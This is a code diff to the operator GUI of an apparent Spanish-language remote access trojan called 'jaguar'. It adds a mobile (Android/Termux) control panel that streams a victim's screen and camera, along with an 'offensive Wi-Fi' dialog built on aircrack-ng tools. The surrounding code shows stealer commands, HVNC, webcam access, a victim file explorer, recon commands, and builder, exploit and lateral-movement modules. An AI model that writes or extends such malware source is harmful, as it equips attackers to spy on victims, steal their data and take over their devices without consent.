@@ -22,6 +22,8 @@ from jaguar.ui.logo import obtener_logo, obtener_icono
 from jaguar.server.servidor import Servidor
 from jaguar.common.constants import APP_NAME, APP_VERSION
 from jaguar.common import config, escaner, exploits, geo, explotadores, lateral, wifi
+from jaguar.ui.movil_dialog import MovilDialog
+from jaguar.ui.wifi_dialog import WifiOfensivoDialog
 from jaguar.builder.constructor import Constructor
 
 COLS = ["", "ID", "Host", "Usuario", "SO", "IP", "País", "ISP", "Lat."]
@@ -33,7 +35,14 @@ VK_ESPECIALES = {
 }
 CMDS_RECON = ("powershell", "whoami", "netstat", "arp", "ipconfig", "tasklist",
               "net_user", "net_view", "schtasks_list", "drives", "env", "wmi",
-              "spawn", "portscan")
+              "spawn", "portscan", "recon_full")
+
+def wifi_ofensivo_hay_stack():
+    try:
+        from jaguar.common import wifi_ofensivo as _wf
+        return _wf.hay_stack()
+    except Exception:
+        return False
 
 
 class TerminalDialog(QDialog):
@@ -808,6 +817,7 @@ class MainWindow(QMainWindow):
         self.hvnc_por_cid = {}
         self.webcams_por_cid = {}
         self.exploradores_por_cid = {}
+        self.movil_por_cid = {}
         self._pings = {}
         self._screenshot_pend = {}
 
@@ -1436,6 +1446,9 @@ class MainWindow(QMainWindow):
         if cmd and cmd.startswith("stealer_") and ok:
             self._stealer_msg(cid, cmd, datos or {})
             return
+        if cmd and cmd.startswith("movil_"):
+            self._movil_msg(cid, cmd, datos if ok else {"error": msg.get("error", "")})
+            return
         self._log(f"[{cid[:8]}] '{cmd}' -> {'OK' if ok else 'ERROR'}")
         if ok and cmd == "captura":
             self._enrutar_frame(cid, datos or {})
@@ -1597,6 +1610,10 @@ class MainWindow(QMainWindow):
             ("🎞  Galería de capturas", lambda: self._abrir_galeria(cid)),
             ("🌐  HVNC (navegador)", lambda: self._abrir_hvnc(cid)),
             ("🗂  Explorador de la víctima", lambda: self._abrir_explorador(cid)),
+            *([("📱  Móvil (Android / Termux)", lambda: self._abrir_movil(cid))]
+              if (self.clientes.get(cid, {}).get("info", {}).get("plataforma") == "android"
+                  or self.clientes.get(cid, {}).get("info", {}).get("caps", {}).get("movil"))
+              else []),
             ("🕵  Stealer: recolectar", lambda: self._stealer_recolectar_cid(cid)),
             ("🕵  Stealer: traer paquete", lambda: self._stealer_traer_cid(cid)),
             ("📊  Info del sistema", lambda: self._enviar_comando(cid, "sysinfo")),
@@ -1782,27 +1799,43 @@ class MainWindow(QMainWindow):
         threading.Thread(target=worker, daemon=True).start()
 
     def _escanear_wifi(self):
-        if not wifi.hay_aircrack():
-            QMessageBox.information(self, "Wi-Fi",
-                                    "Falta aircrack-ng (airmon-ng/airodump-ng).")
+        """Abre la ventana de Wi-Fi ofensivo (wifi_ofensivo)."""
+        if not wifi_ofensivo_hay_stack():
+            QMessageBox.information(
+                self, "Wi-Fi",
+                "Falta el stack 802.11 (aircrack-ng / airodump-ng / aireplay-ng / iw).\n"
+                "El escáner IP sigue funcionando sin él.")
             return
+        self._wifi_dlg = WifiOfensivoDialog(self)
+        self._wifi_dlg.show()
 
-        def worker():
-            ifaces = wifi.interfaces()
-            if not ifaces:
-                self._log("[wifi] sin interfaces inalámbricas")
-                return
-            mon = wifi.poner_monitor(ifaces[0])
-            if not mon:
-                self._log("[wifi] no pude activar modo monitor")
-                return
-            self._log(f"[wifi] monitor en {mon}, capturando 15s...")
-            aps = wifi.escanear(mon, 15)
-            for a in aps:
-                self._log(f"[wifi] {a['essid'] or '(oculto)'} | {a['bssid']} | "
-                          f"canal {a['canal']} | {a['cifrado']} | {a['senal']}dBm")
-            self._log(f"[wifi] {len(aps)} redes encontradas")
-        threading.Thread(target=worker, daemon=True).start()
+    def _abrir_movil(self, cid):
+        if cid not in self.clientes:
+            return
+        dlg = MovilDialog(cid, self.clientes[cid]["item"].text(2),
+                          info=self.clientes[cid]["info"], parent=self)
+        self.movil_por_cid.setdefault(cid, []).append(dlg)
+        dlg.show()
+
+    def _movil_msg(self, cid, cmd, datos):
+        """Reenvia una respuesta movil_* al dialogo movil de ese cliente."""
+        datos = datos or {}
+        for dlg in self.movil_por_cid.get(cid, []):
+            try:
+                if datos.get("error") and not datos.get("b64"):
+                    dlg._sig_datos.emit(cmd, datos)
+                elif cmd == "movil_pantalla":
+                    dlg._sig_pantalla.emit(datos.get("b64", ""),
+                                           int(datos.get("w", 0) or 0),
+                                           int(datos.get("h", 0) or 0))
+                elif cmd == "movil_camara":
+                    dlg._sig_camara.emit(datos.get("b64", ""),
+                                         int(datos.get("w", 0) or 0),
+                                         int(datos.get("h", 0) or 0))
+                else:
+                    dlg._sig_datos.emit(cmd, datos)
+            except Exception:
+                pass
 
     def _on_escaneo_prog(self, v):
         self.barra.setValue(v)
